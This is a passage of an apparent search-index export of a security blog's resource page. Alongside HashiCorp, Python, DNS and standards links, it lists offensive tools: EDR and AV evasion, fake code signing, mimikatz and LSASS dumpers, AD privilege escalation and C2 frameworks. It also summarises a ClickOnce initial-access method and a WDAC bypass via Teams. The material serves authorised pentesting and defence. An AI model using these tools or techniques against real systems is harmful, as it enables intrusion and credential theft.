</ul>"},{"location":"blog/2019/07/15/-resources/#hashicorp","title":"HashiCorp","text":"<p>HashiCorp Utilities</p> <p>Use infrastructure as code to build, deploy, and manage the infrastructure that underpins cloud applications.</p> <p>Validate your installs with one of these public keys:</p> <ul> <li>HashiCorp public keys <code>C874 011F 0AB4 0511 0D02 1055 3436 5D94 72D7 468F</code></li> <li>HashiCorp public keys on keybase.io <code>C874 011F 0AB4 0511 0D02 1055 3436 5D94 72D7 468F</code></li> <li>HashiCorp apt gpg key <code>798A EC65 4E5C 1542 8C8E 42EE AA16 FCBC A621 E701</code></li> <li>How to Verify a Hashicorp Binary</li> </ul> Packer <p>Packer is a tool that lets you create identical machine images for multiple platforms from a single source template. Packer can create golden images to use in image pipelines.</p> <ul> <li>https://developer.hashicorp.com/packer</li> </ul> <p>Packer literally builds virtual machines images. Think of installing Kali or Windows from the ISO manually in VMware, Hyper-V, VirtualBox, QEMU, or anywhere else (supported by packer). Packer actually automates those steps, even down to the boot key presses so you can build and configure a VM with zero interaction. You can see this happen in real time if you aren't running packer in headless mode. The VM GUI window will open as if you were doing the install yourself, and you can watch it run.</p> <p>To really utilize packer, you'll need to learn and implemenet (depending on the OS and technology available) cloud-init, autoinstall, preseed, or similar auto-provisioning mechanisms so you don't have to manually intervene.</p> <p>You can also post-process the install with additional shell commands, scripts, Ansible playbooks, and more.</p> <p>The resulting images can be imported into a hypervisor, sent to a cloud provider as the disk image for a cloud VM, or converted into a Vagrant box image.</p> Vagrant <p>Vagrant is the command line utility for managing the lifecycle of virtual machines. Isolate dependencies and their configuration within a single disposable and consistent environment.</p> <ul> <li>https://developer.hashicorp.com/vagrant</li> </ul> Terraform <p>Terraform is an infrastructure as code tool that lets you build, change, and version infrastructure safely and efficiently. This includes low-level components like compute instances, storage, and networking; and high-level components like DNS entries and SaaS features.</p> <ul> <li>https://developer.hashicorp.com/terraform</li> </ul>"},{"location":"blog/2019/07/15/-resources/#python","title":"Python","text":"<p>Overview, Install, and Usage</p> <ul> <li>https://www.python.org/</li> <li>Documentation</li> <li>What is Python?</li> </ul> <p>Python is an interpreted, interactive, object-oriented programming language. It incorporates modules, exceptions, dynamic typing, very high level dynamic data types, and classes. It supports multiple programming paradigms beyond object-oriented programming, such as procedural and functional programming. Python combines remarkable power with very clear syntax. It has interfaces to many system calls and libraries, as well as to various window systems, and is extensible in C or C++. It is also usable as an extension language for applications that need a programmable interface. Finally, Python is portable: it runs on many Unix variants including Linux and macOS, and on Windows.</p> <p>Installing Python</p> <ul> <li>python.org: Windows Binaries</li> <li>python.org: GPG Signing Keys</li> </ul> <p>Verifying PGP Signatures</p> <p>Windows binaries are already signed and can be reviewed with sigcheck.exe, however you can also use GPG to verify the detached signature. You'll use Steve Dower's PGP key to verify Windows binaries.</p> <pre><code>pub   rsa4096/0xFC624643487034E5 2015-04-06 [SC]\n    Key fingerprint = 7ED1 0B65 31D7 C8E1 BC29  6021 FC62 4643 4870 34E5\nuid                             Steve Dower (Python Release Signing) &lt;steve.dower@microsoft.com&gt;\nsub   rsa4096/0xE314D10907F87583 2015-04-06 [E]\n</code></pre>  pip <ul> <li>Installing pip</li> <li>python.org: Installing pip Using Package Managers</li> <li>python.org: Installing Packages via pip</li> <li>github.com/pypa</li> </ul> <p>Install using built in method (Not recommended on Ubuntu)</p> <pre><code>python3 -m ensurepip\n</code></pre> <p>Install from package managers (Recommended on Debian and Fedora OS's, the package is always named <code>python3-pip</code>):</p> <pre><code># apt\nsudo apt install python3-pip\n\n# dnf\nsudo dnf install python3-pip\n</code></pre> <p>Why install from apt on Ubuntu?</p> <ul> <li>Ansible: Ensure pip is Available</li> <li>python.org: Installing Using Linux Tools</li> <li>python.org: Installing Using Linux Tools (Debian/Ubuntu)</li> </ul> <p>ensurepip is disabled in Debian/Ubuntu for the system python.</p>  PEP <ul> <li>https://peps.python.org/</li> </ul> <p>PEP stands for Python Enhancement Proposal. A PEP is a design document providing information to the Python community, or describing a new feature for Python or its processes or environment. The PEP should provide a concise technical specification of the feature and a rationale for the feature.</p> <p>We intend PEPs to be the primary mechanisms for proposing major new features, for collecting community input on an issue, and for documenting the design decisions that have gone into Python. The PEP author is responsible for building consensus within the community and documenting dissenting opinions.</p> <p>Because the PEPs are maintained as text files in a versioned repository, their revision history is the historical record of the feature proposal. This historical record is available by the normal git commands for retrieving older revisions, and can also be browsed on GitHub.</p>"},{"location":"blog/2019/07/15/-resources/#go","title":"Go","text":"<p>Project source and install instructions</p> <p>Go is an open source project developed by a team at Google and many contributors from the open source community. Go is distributed under a BSD-style license.</p> <p>Taken from the README:</p> <p>Official binary distributions are available at https://go.dev/dl/.</p> <p>After downloading a binary release, visit https://go.dev/doc/install for installation instructions.</p> <p>Our canonical Git repository is located at https://go.googlesource.com/go. There is a mirror of the repository at https://github.com/golang/go.</p> <p>Additionally, note that https://golang.org/ is the older domain before it was updated to go.dev.</p> <p>The frequently asked questions page has information on why Go was made, the goals of the project, and some history.</p>"},{"location":"blog/2019/07/15/-resources/#information-technology","title":"Information Technology","text":"RFC <p>Request for Comments.</p> <p>Get the full story on the about page, but effectively RFC's are published and reviewed documentation that can include information about various internet standards.</p> <ul> <li>https://www.rfc-editor.org/retrieve/</li> </ul> IETF <p>Internet Engineering Task Force.</p> <p>The Internet Engineering Task Force (IETF), founded in 1986, is the premier standards development organization (SDO) for the Internet. The IETF makes voluntary standards that are often adopted by Internet users, network operators, and equipment vendors, and it thus helps shape the trajectory of the development of the Internet. But in no way does the IETF control, or even patrol, the Internet.</p> <ul> <li>https://www.ietf.org/</li> </ul> InterNIC <p>Public Information Regarding Internet Domain Name Registration Services.</p> <p>InterNIC is a registered service mark of the U.S. Department of Commerce. It is licensed to the Internet Corporation for Assigned Names and Numbers, which operates this web site.</p> <ul> <li>https://www.internic.net</li> <li>Named root-hints file, use curl or wget</li> </ul> ICANN <p>The Internet Corporation for Assigned Names and Numbers.</p> <p>ICANN's mission is to help ensure a stable, secure, and unified global Internet. To reach another person on the Internet, you need to type an address - a name or a number - into your computer or other device. That address must be unique so computers know where to find each other.</p> <p>ICANN helps coordinate and support these unique identifiers across the world. ICANN was formed in 1998 as a nonprofit public benefit corporation with a community of participants from all over the world.</p> <ul> <li>https://www.icann.org/</li> <li>https://lookup.icann.org/</li> </ul> IANA <p>Internet Assigned Numbers Authority</p> <p>The global coordination of the DNS Root, IP addressing, and other Internet protocol resources is performed as the Internet Assigned Numbers Authority (IANA) functions.</p> <ul> <li>https://www.iana.org/</li> <li>DNS response codes</li> </ul> ARIN <p>American Registry for Internet Numbers.</p> <p>Established in December 1997, the American Registry for Internet Numbers (ARIN) is a nonprofit, member-based organization that supports the operation and growth of the Internet.</p> <p>ARIN accomplishes this by carrying out its core service, which is the management and distribution of Internet number resources such as Internet Protocol (IP) addresses and Autonomous System Numbers (ASNs). ARIN manages these resources within its service region, which is comprised of Canada, the United States, and many Caribbean and North Atlantic islands. ARIN also coordinates policy development by the community and advances the Internet through informational outreach.</p> <p>You can perform WHOIS lookups and obtain ownership information on network ranges and addresses through ARIN.</p> <ul> <li>https://www.arin.net/</li> </ul> MDN (Mozilla Developer Network) Documentation <p>This is an essential resource for anything web standards (or web code) related.</p> <p>MDN Web Docs is an open-source, collaborative project that documents web platform technologies, including CSS, HTML, JavaScript, and Web APIs. We also provide extensive \ud83e\uddd1\u200d\ud83c\udf93 learning resources for beginning developers and students.</p> <ul> <li>https://github.com/mdn</li> <li>Web Specification Docs</li> </ul> W3C (World Wide Web Consortium) <p>An international community that develops open standards to ensure the long-term growth of the Web.</p> <ul> <li>https://github.com/w3c</li> <li>https://w3c.github.io/html-reference/</li> </ul> Usb Specifications &amp; Documentation <p>usb.org details everything about the USB specification. This is useful for example if you're observing USB communications with Wireshark or building rules for USBGuard.</p> <ul> <li>https://usb.org/</li> <li>https://www.usb.org/defined-class-codes</li> </ul> FCCID <p>FCC documentation and searchable databases.</p> <ul> <li>https://www.fcc.gov/oet/ea/fccid</li> <li>https://fccid.io</li> </ul>"},{"location":"blog/2019/07/15/-resources/#information-security","title":"Information Security","text":""},{"location":"blog/2019/07/15/-resources/#dns","title":"DNS","text":"Cloudflare 1.1.1.1 <p>1.1.1.1 offers an encrypted service through DNS over HTTPS (DoH) or DNS over TLS (DoT) for increased security and privacy.</p> <ul> <li>https://developers.cloudflare.com/dns/</li> <li>https://developers.cloudflare.com/1.1.1.1/</li> </ul> <p>To see if you're on 1.1.1.1, go to https://one.one.one.one/help/</p> Quad9 9.9.9.9 <p>Quad9 is a free service that replaces your default ISP or enterprise Domain Name Server (DNS) configuration.</p> <p>Features include DNS over TLS, HTTPS, DNSSEC, threat blocking, and more.</p> <ul> <li>https://quad9.net/</li> </ul> <p>To see if you're on Quad9, to to https://on.quad9.net/.</p> NextDNS <p>NextDNS is essentially a web-based solution to give you full visibility and control over your DNS usage. There are both free and paid plans.</p> <ul> <li>https://nextdns.io/</li> </ul> <p>To see if you're on NextDNS, go to https://test.nextdns.io/.</p> DNS4EU <p>Supported by the European Union Agency for Cybersecurity (ENISA), the European Union's DNS4EU secure-infrastructure project provides a protective, privacy-compliant, and resilient DNS service to strengthen digital sovereignty and security for EU citizens, governments, and critical infrastructure.</p> <p>Discovered on the SANS ISC Stormcast from Tuesday, June 10th, 2025.</p> <ul> <li>https://www.joindns4.eu/</li> <li>Resolver Configuration Information</li> </ul> <p>Currently there's no browser-based diagnostic endpoint dedicated to verifying you're using their resolvers like Cloudflare or Quad9 have.</p> Trickest Resolvers <p>The most exhaustive list of reliable DNS resolvers</p> <ul> <li>https://github.com/trickest/resolvers</li> </ul>"},{"location":"blog/2019/07/15/-resources/#offense","title":"Offense","text":""},{"location":"blog/2019/07/15/-resources/#methodology-general-resources","title":"Methodology &amp; General Resources","text":"<p>PTES (Penetration Testing Execution Standard)</p> <p>The PTES is a standard first drafted in 2009. It's designed to provide both businesses and security service providers with a common language and scope for performing penetration testing. It's been referenced in a number of training courses and by those who helped create it over the years. The FAQ provides additonal overview.</p> <p>Kevin Johnson (SecureIdeas, OpenSBK) was on Paul's Security Weekly #785 to talk about this updated version of the PTES, now on GitHub for others to contribute to. It was mentioned again in SWN-453, where one of OpenSBK's goals in addition to updating the PTES will be defining the language used in InfoSec.</p> <ul> <li>OpenSBK's PTES: https://github.com/OpenSBK/ptes</li> <li>Original Site: http://www.pentest-standard.org/index.php</li> <li>Original Site (Wayback Machine): https://web.archive.org/web/20211220050516/http://www.pentest-standard.org/index.php/Main_Page</li> </ul> <p>Unified Entity Context</p> <p>Unified Entity Context: The AI Stack Everyone is Building Without Realizing It</p> <p>This was discussed as one piece of another episode of Unsupervised Learning by Daniel Miessler. The gist of the episode is AI with a complete context of information, which includes accuracy, understanding of stale or historical information, having access to current information, organizational goals, and more, leads to a world where decision making and understanding isn't splintered and siloed by front ends, platforms, or databases. It's effectively central to an organization with RBAC handled through identity. While all data \"lives\" in a central location, this removal of silos and handling of access maintains security while improving decision making and understanding by those interacting with the data.</p> <p>The highlight though is the approach to a security assessment that was discussed.</p> <p>Ask these questions to each \"layer\" of an organization, starting with the C-suite:</p> <ul> <li>What is the core function of the business?</li> <li>What are the company's goals?</li> <li>Where is input and output data flowing?</li> </ul> <p>Use the answers to build a visual map, to illustrate what the company really looks like:</p> <ul> <li>Data flow and storage</li> <li>Vendors</li> <li>Who is accessing what</li> <li>What should and should not be in this map</li> </ul> <p>This creates the context or foundation for you to begin any assessment by revealing areas to focus on you would otherwise not know about without this context.</p> HackTricks <p>HackTricks is one of the largest resources of hacking knowledge. The original author also created PEASS.</p> <ul> <li>https://book.hacktricks.wiki/</li> <li>https://github.com/HackTricks-wiki/hacktricks</li> </ul> SecLists <ul> <li>https://github.com/danielmiessler/SecLists</li> </ul> Statistically Likely Usernames <ul> <li>https://github.com/insidetrust/statistically-likely-usernames</li> </ul> Trickest Wordlists_ <ul> <li>https://github.com/trickest/wordlists</li> </ul>"},{"location":"blog/2019/07/15/-resources/#network","title":"Network","text":"<p>This includes general network information as well as network-focused tools.</p> nmap <p>Perhaps the most well known network scanner available.</p> <ul> <li>https://nmap.org/</li> </ul> naabu <p>A fast port scanner written in go with a focus on reliability and simplicity. Designed to be used in combination with other tools for attack surface discovery in bug bounties and pentests</p> <p>naabu's release binaries are statically compiled. This is incredibly useful if you're struggling to get a statically compiled <code>nmap</code> to run on a machine.</p> <ul> <li>https://github.com/projectdiscovery/naabu</li> </ul> masscan <p>TCP port scanner, spews SYN packets asynchronously, scanning entire Internet in under 5 minutes.</p> <ul> <li>https://github.com/robertdavidgraham/masscan</li> </ul> SSH-Snake <p>SSH-Snake is a self-propagating, self-replicating, file-less script that automates the post-exploitation task of SSH private key and host discovery.</p> <ul> <li>https://github.com/MegaManSec/SSH-Snake</li> </ul>"},{"location":"blog/2019/07/15/-resources/#web-application","title":"Web Application","text":"<p> OWASP Top 10</p> <p>The OWASP Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.</p> <p>Globally recognized by developers as the first step towards more secure coding.</p> <p>Companies should adopt this document and start the process of ensuring that their web applications minimize these risks. Using the OWASP Top 10 is perhaps the most effective first step towards changing the software development culture within your organization into one that produces more secure code.</p> <ul> <li>https://owasp.org/www-project-top-ten/</li> <li>https://github.com/OWASP/www-project-top-ten/blob/master/index.md</li> </ul> <p> OWASP Web Security Testing Guides</p> <p>The Web Security Testing Guide is a comprehensive Open Source guide to testing the security of web applications and web services.</p> <ul> <li>https://github.com/OWASP/wstg</li> <li>WSTG Table of Contents</li> <li>WSTG Checklists</li> <li>OWASP Cheat Sheets</li> </ul> PayloadsAllTheThings <p>A collection of payloads and techniques for application security / web application pentesting.</p> <ul> <li>https://swisskyrepo.github.io/PayloadsAllTheThings/</li> <li>https://github.com/swisskyrepo/PayloadsAllTheThings</li> </ul>  Burpsuite <p>Web application security testing tool, has free and paid licenses.</p> <ul> <li>https://portswigger.net/burp</li> </ul>  ZAProxy <p>Open source and free alternative to Burpsuite maintained by OWASP.</p> <ul> <li>https://github.com/zaproxy/</li> </ul> <pre><code># Install in Kali\nsudo apt install -y zaproxy\n</code></pre> Caido <p>A new web application pentesting tool, similar to Burpsuite, has free and paid plans.</p> <ul> <li>https://caido.io/</li> <li>https://github.com/caido</li> </ul> JS-TAP <p>JavaScript payload and supporting software to be used as XSS payload or post exploitation implant to monitor users as they use the targeted application. Also includes a C2 for executing custom JavaScript payloads in clients, and a \"mimic\" feature that automatically generates custom payloads.</p> <p>Trap Mode uses the iframe trap technique. Implant mode means you've embedded JS-TAP into a javascript file on the server after gaining access to the server.</p> <ul> <li>https://github.com/hoodoer/JS-Tap</li> <li>https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams</li> </ul> SquareX: Polymorphic Extensions <p>Researchers demonstrate malicious browser extensions can effectively mimic and disable other browser extensions without really notifiying the user. The example in the demo video shows a proof-of-concept tool mimicking the user's password manager browser extension.</p> <p>Discovered on Security Weekly News #457.</p> <ul> <li>https://sqrx.com/polymorphic-extensions</li> </ul>"},{"location":"blog/2019/07/15/-resources/#linux-unix-like","title":"Linux &amp; Unix-like","text":"GTFOBins <p>GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.</p> <ul> <li>https://gtfobins.github.io/</li> </ul> LOLESXi <p>LOLESXi features a comprehensive list of binaries/scripts natively available in VMware ESXi that adversaries have utilised in their operations. The information on this site is compiled from open-source threat research.</p> <ul> <li>https://github.com/LOLESXi-Project/LOLESXi</li> </ul> Curing <p>Curing is a POC of a rootkit that uses io_uring to perform different tasks without using any syscalls.</p> <p>Discovered on Schneier's blog.</p> <ul> <li>https://github.com/armosec/curing</li> </ul>"},{"location":"blog/2019/07/15/-resources/#windows","title":"Windows","text":"<p>Enumeration</p> PEASS-ng <ul> <li>https://github.com/peass-ng/PEASS-ng</li> </ul> HostRecon <ul> <li>https://github.com/dafthack/HostRecon</li> </ul> Seatbelt <ul> <li>https://github.com/GhostPack/Seatbelt</li> </ul> PrivescCheck <ul> <li>https://github.com/itm4n/PrivescCheck</li> </ul> <p>Execution &amp; PrivEsc</p> PowerSploit <ul> <li>https://github.com/PowerShellMafia/PowerSploit</li> </ul> LOLBAS <p>Living Off The Land Binaries, Scripts and Libraries</p> <ul> <li>https://lolbas-project.github.io/#</li> </ul> LOLDrivers <p>An extensive and well-organized collection of vulnerable and malicious Windows drivers.</p> <ul> <li>https://github.com/magicsword-io/LOLDrivers</li> <li>https://www.loldrivers.io/</li> </ul> HijackLibs <p>This project aims to keep a record of publicly disclosed DLL Hijacking opportunities.</p> <p>You can find the web version of this repository on https://www.hijacklibs.net.</p> <ul> <li>https://github.com/wietze/HijackLibs</li> </ul> UACME <ul> <li>https://github.com/hfiref0x/UACME</li> </ul> PrintSpoofer <ul> <li>https://github.com/itm4n/PrintSpoofer</li> </ul> WinPwn <ul> <li>https://github.com/S3cur3Th1sSh1t/WinPwn</li> <li>https://github.com/S3cur3Th1sSh1t/Creds</li> </ul> Bolthole <p>A proof-of-concept ClickOnce payload for Red Teams to establish initial access in authorized penetration tests.</p> <ul> <li>https://github.com/rvrsh3ll/Bolthole</li> <li>Exploring ClickOnce and .NET Hijacking for SSH Initial Access</li> </ul> <p>This is another BHIS tool presentation, this time by Steve Borosh. To try and summarize:</p> <ul> <li>Use Azure WebApps to deliver the payload through a ClickOnce dialogue, on a \"trusted\" domain</li> <li>This is the same style of prompt you get when opening application links in the browser</li> <li>Effectiveness depends on the ruse / social engineering / circumstance</li> <li>The app is a signed ssh / sshd package in .NET</li> <li>It's designed and embedded with the key material to connect back to your own server</li> <li>The connection does not allow command execution</li> <li>The connecting user has no shell <code>sudo useradd -m -s /usr/sbin/nologin clientnameuser</code></li> <li>The attacker gains a full SOCKS proxy through the endpoint</li> <li>This may not look entirely malicious to some tools</li> </ul> <p>How to detect this:</p> <ul> <li>Look at networked processes on endpoints</li> <li>Inspecting protocols on ALL ports</li> <li>Inspecting code signatures on binaries</li> <li>Preventing execution of unauthorized applications</li> </ul> <p>Evasion</p> CarbonCopy <p>A tool which creates a spoofed certificate of any online website and signs an Executable for AV Evasion. Works for both Windows and Linux.</p> <ul> <li>https://github.com/paranoidninja/CarbonCopy</li> </ul> <p>Mentioned in Discord at 42:57 of Exploring ClickOnce and .NET Hijacking for SSH Initial Access.</p> SigThief <p>Stealing Signatures and Making One Invalid Signature at a Time.</p> <ul> <li>https://github.com/secretsquirrel/SigThief</li> </ul> <p>Mentioned in Discord at 42:57 of Exploring ClickOnce and .NET Hijacking for SSH Initial Access.</p> LazySign <p>Create fake certs for binaries using windows binaries and the power of bat files.</p> <ul> <li>https://github.com/jfmaes/LazySign</li> </ul> <p>Mentioned in Discord at 42:57 of Exploring ClickOnce and .NET Hijacking for SSH Initial Access.</p> Limelighter <p>A tool which creates a spoof code signing certificates and sign binaries and DLL files to help evade EDR products and avoid MSS and sock scruitney. LimeLighter can also use valid code signing certificates to sign files. Limelighter can use a fully qualified domain name such as <code>acme.com</code>.</p> <ul> <li>https://github.com/Tylous/Limelighter</li> </ul> <p>Mentioned in Discord at 42:57 of Exploring ClickOnce and .NET Hijacking for SSH Initial Access.</p> Bypassing Windows Defender Application Control (WDAC) with Loki C2 <p>...because I replaced the Teams /resources/app/ directory with Loki C2 Agent's code, the Electron-based Teams application now executes Loki C2 Agent's JavaScript inside the trusted Teams process.</p> <ul> <li>https://securityintelligence.com/x-force/bypassing-windows-defender-application-control-loki-c2/</li> </ul> <p>Additional resources from the article:</p> <ul> <li>Microsoft: Applications that can Bypass WDAC and How to Block Them</li> <li>T1218.015: System Binary Proxy Execution: Electron Applications</li> <li>https://github.com/mttaggart/quasar</li> <li>https://taggart-tech.com/quasar-electron/</li> </ul> <p>To try and summarize this:</p> <ul> <li>WDAC is a security boundary to prevent executing untrusted software</li> <li>LOLBAS details these kinds of bypasses</li> <li>Electron applications are interesting targets<ul> <li>They're the reverse of EXE / DLL's in that the Electron EXE exposes API's to .js files and .node modules</li> <li>Goal is to execute arbitrary JS and leverage existing Node modules through a trusted Electron application</li> <li>Electron apps can enforce integrity checking on JS scripts they execute which can help mitigate this vector</li> </ul> </li> <li>Node modules have limitations, but can be stealthier<ul> <li>Largely undocumented internal structures</li> <li>If you use a function of a signed Node module instead of PowerShell, you avoid spawning processes and being caught</li> <li>Execute everything in JS to remain stealthier</li> </ul> </li> <li>The post uses the legacy version of Teams to achieve code execution and C2 deployment via JS</li> </ul> SharpKiller <ul> <li>https://github.com/S1lkys/SharpKiller</li> </ul> Amsi-Killer <ul> <li>https://github.com/ZeroMemoryEx/Amsi-Killer</li> </ul> Invoke-SharpLoader <ul> <li>https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader</li> </ul> KillDefender <ul> <li>https://github.com/pwn1sher/KillDefender</li> </ul> EDRSandblast <ul> <li>https://github.com/wavestone-cdt/EDRSandblast</li> </ul> PPLdump <ul> <li>https://github.com/itm4n/PPLdump</li> </ul> PPLGuard <ul> <li>https://github.com/elastic/PPLGuard</li> </ul> Invoke-Obfuscation <p>Invoke-Obfuscation is a PowerShell v2.0+ compatible PowerShell command and script obfuscator.</p> <ul> <li>https://github.com/danielbohannon/Invoke-Obfuscation</li> <li>https://github.com/danielbohannon/Revoke-Obfuscation</li> <li>https://github.com/danielbohannon/Invoke-CradleCrafter</li> <li>https://github.com/danielbohannon/Invoke-DOSfuscation</li> </ul> <p>Data Harvesting &amp; Exfiltration</p> pypykatz <p>pypykatz allows you to work with Windows data dumps locally on Linux.</p> <ul> <li>https://github.com/skelsec/pypykatz</li> </ul> mimikatz <ul> <li>https://github.com/gentilkiwi/mimikatz</li> </ul> Invoke-Mimikatz <ul> <li>https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1</li> </ul> LetMeowIn <p>A sophisticated, covert LSASS dumper using C++ and MASM x64.</p> <ul> <li>https://github.com/Meowmycks/LetMeowIn</li> </ul>"},{"location":"blog/2019/07/15/-resources/#macos","title":"macOS","text":"<pre><code>\u26a0\ufe0f TO DO \u26a0\ufe0f\n</code></pre>"},{"location":"blog/2019/07/15/-resources/#active-directory","title":"Active Directory","text":"adsecurity.org <p>One of the most robust resources to Active Directory security, hardening, pentesting, and information in general.</p> <ul> <li>https://adsecurity.org/</li> </ul> InternalAllTheThings <p>Active Directory and internal pentest cheatsheets.</p> <ul> <li>https://swisskyrepo.github.io/InternalAllTheThings/</li> <li>https://github.com/swisskyrepo/InternalAllTheThings</li> </ul> SharpLAPS <p>Retrieve LAPS password from LDAP.</p> <ul> <li>https://github.com/swisskyrepo/SharpLAPS</li> </ul> KrbRelayUp <p>A no-fix local privesc to SYSTEM on AD joined machines where LDAP signing is not enforced</p> <p>Manually executing this attack combines PowerMad/SharpMad + KrbRelay + Rubeus + SCMUACBypass. This tool wraps all of those tools together.</p> <ul> <li>https://github.com/Dec0ne/KrbRelayUp</li> </ul>"},{"location":"blog/2019/07/15/-resources/#wireless","title":"Wireless","text":"<p>WiFi Challenge Lab Walkthrough</p> <p>Think of this as \"WirelessAllTheThings\". This walkthrough will demonstrate a number of WiFi attacks, from recon and basic commands to operate wireless tools on Linux, to attacking OPN, WEP, WPA/2/3 and MGT enterprise networks.</p> <p>The latest information is available in the CWP Course.</p> <ul> <li>https://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/</li> <li>wpa_supplicant Configuration Templates</li> <li>Attack Paths Based on Network Type</li> </ul> <p>eaphammer Wiki</p> <p>eaphammer is one of the most versatile wireless pentesting tools available, with capabilities for targeting enterprise (WPA-MGT) networks, hosting rogue APs with captive portals and more.</p> <p>The Wiki contains a ton of useful information for wireless pentesting methods and tools.</p> <ul> <li>eaphammer Wiki</li> </ul> <p>Pi-PwnBox Rogue-AP Wiki</p> <p>The project itself focuses on being a guide for building and managing a homemade (headless) PwnBox / RogueAP based on Raspberry Pi &amp; Alfa WiFi USB Adapters.</p> <p>The Wiki contains a ton of useful information for wireless pentesting methods and tools. This includes methodology, tool commands, and a Mind Map that can help you work out the plan of attack based on any situation.</p> <ul> <li>Pi-PwnBox Rogue-AP Wiki</li> <li>WPA Protocol Overview</li> </ul> USB-WiFi Guide <p>The mission of this site is to provide educational information, reviews of USB WiFi adapters and links to specific adapters that are known to perform well with Linux ( see The Plug and Play List ).</p> <ul> <li>https://github.com/morrownr/USB-WiFi</li> <li>Recommended Adapters for Kali Linux</li> </ul> <p>The cards using the mediatek/mt76 drivers appear to be the most supported as of early 2025.</p> <p>When comparing available cards, note the AXML and AXM cards look the same but are different from the ACH and ACM cards in that they also have Bluetooth functionality built-in (which casues issues on Ubuntu in some cases). All 4 use the mediatek/mt76 drivers.</p> rtl8812au <p>These kernel drivers are no longer included in Kali by default, and these repos are where you'll need to obtain the source to compile and load them.</p> <p>You'll run into this if you use some of the popular ALFA USB cards like the AWUS036ACH, or AWUS036ACS.</p> <ul> <li>https://github.com/aircrack-ng/rtl8812au (Deprecated)</li> <li>https://github.com/lwfinger/rtw88 (Current)</li> </ul> WiFiChallengeLab-docker <p>This is one of the most useful resources to learning nearly all wireless recon and attack paths in a safe and isolated environment. Deployment options include:</p> <ul> <li>Pull the VM from Vagrant or GitHub releases</li> <li>Alternatively install and run the entire lab through docker on a VM or host you have</li> </ul> <p>My preference is to configure a Kali Linux VM as I would to prepare it for wireless testing, and run the lab via docker on top of it. Your VM will have virtual wireless cards added through the 80211_hwsim kernel module. You can use these to interact with the containerized AP's as if they were \"real\".</p> <p>Docker version of WiFiChallenge Lab with modifications in the challenges and improved stability. Ubuntu virtual machine with virtualized networks and clients to perform WiFi attacks on OPN, WPA2, WPA3 and Enterprise networks.</p> <ul> <li>https://github.com/r4ulcl/WiFiChallengeLab-docker</li> </ul> Wifi-Forge <p>Virtual wireless pentesting lab from BHIS.</p> <p>Wi-Fi Forge provides a safe and legal environment for learning WiFi hacking. Based on the open source Mininet-Wifi, this project automatically sets up the networks and tools needed to run a variety of WiFi exploitation labs, removing the need for the overhead and hardware normally required to perform these attacks.</p> <ul> <li>https://github.com/blackhillsinfosec/Wifi-Forge</li> </ul> Rayhunter <p>Rust tool to detect cell site simulators on an orbic mobile hotspot.</p> <ul> <li>https://github.com/EFForg/rayhunter</li> </ul> Chrome's Built-in Bluetooth Scanner <p>Discoverd on PSW #867.</p> <p>Access the interface via: <code>chrome://bluetooth-internals</code> to scan for nearby bluetooth devices.</p> <ul> <li>This works on most desktop versions of Chrome</li> <li>Does not appear to work on iOS</li> </ul> wifi_db <p>A utility from the creator of WiFi-ChallengeLab to pull useful information from capture files. This is a python tool that creates a browseable SQLite DB.</p> <ul> <li>https://github.com/r4ulcl/wifi_db</li> </ul> pcapFilter.sh <p>A utility from the creator of WiFi-ChallengeLab to pull useful information from capture files. This is a CLI tool that outputs text by using <code>tshark</code> filters.</p> <ul> <li>https://gist.github.com/r4ulcl/f3470f097d1cd21dbc5a238883e79fb2</li> </ul>"},{"location":"blog/2019/07/15/-resources/#cloud","title":"Cloud","text":"MSFTRecon <p>MSFTRecon is a reconnaissance tool designed for red teamers and security professionals to map Microsoft 365 and Azure tenant infrastructure. It performs comprehensive enumeration without requiring authentication, helping identify potential security misconfigurations and attack vectors.</p> <ul> <li>https://github.com/Arcanum-Sec/msftrecon</li> </ul> GraphRunner <p>GraphRunner is a post-exploitation toolset for interacting with the Microsoft Graph API. It provides various tools for performing reconnaissance, persistence, and pillaging of data from a Microsoft Entra ID (Azure AD) account.</p> <p>It consists of three separate parts:</p> <ul> <li>A PowerShell script where the majority of modules are located</li> <li>An HTML GUI that can leverage an access token to navigate and pillage a user's account</li> <li>A simple PHP redirector for harvesting authentication codes during an OAuth flow</li> </ul> <ul> <li>https://github.com/dafthack/GraphRunner</li> </ul> Cloud S.L.A.W <p>Cloud Security Lab a Week is a free and high-quality cloud security training platform.</p> <p>Discovered on Unsupervised Learning NO. 471 .</p> <ul> <li>https://slaw.securosis.com/</li> </ul>"},{"location":"blog/2019/07/15/-resources/#ics-ot","title":"ICS &amp; OT","text":"HardwareAllTheThings <p>Hardware/IOT Pentesting Wiki</p> <ul> <li>https://swisskyrepo.github.io/HardwareAllTheThings/</li> <li>https://github.com/swisskyrepo/HardwareAllTheThings</li> </ul>"},{"location":"blog/2019/07/15/-resources/#c2","title":"C2","text":"Sliver <p>Sliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. Sliver's implants support C2 over Mutual TLS (mTLS), WireGuard, HTTP(S), and DNS and are dynamically compiled with per-binary asymmetric encryption keys.</p> <p>The server and client support MacOS, Windows, and Linux. Implants are supported on MacOS, Windows, and Linux (and possibly every Golang compiler target but we've not tested them all).</p> <ul> <li>https://github.com/BishopFox/sliver</li> </ul> Merlin <p>Merlin is a cross-platform post-exploitation HTTP/2 Command &amp; Control server and agent written in golang.</p> <ul> <li>https://github.com/Ne0nd0g/merlin</li> </ul> Mythic <p>A collaborative, multi-platform, red teaming framework.</p> <ul> <li>https://github.com/its-a-feature/Mythic</li> </ul> TrevorC2 <p>TrevorC2 is a legitimate website (browsable) that tunnels client/server communications for covert command execution. Written by: Dave Kennedy (@HackingDave) Website: https://www.trustedsec.com.</p> <p>TrevorC2 is a client/server model for masking command and control through a normally browsable website. Detection becomes much harder as time intervals are different and does not use POST requests for data exfil.</p> <ul> <li>https://github.com/trustedsec/trevorc2</li> </ul>"},{"location":"blog/2019/07/15/-resources/#defense","title":"Defense","text":""},{"location":"blog/2019/07/15/-resources/#security-platforms","title":"Security Platforms","text":"<p>Why Platforms?</p> <p>This sections covers what I would call \"Security Platforms\". This is intentionally generic, and meant to be a catch-all for the security \"things\" out there that are not a single-purpose tool, framework, or a solution specific to any system.</p> <p>This section may be broken down later, but 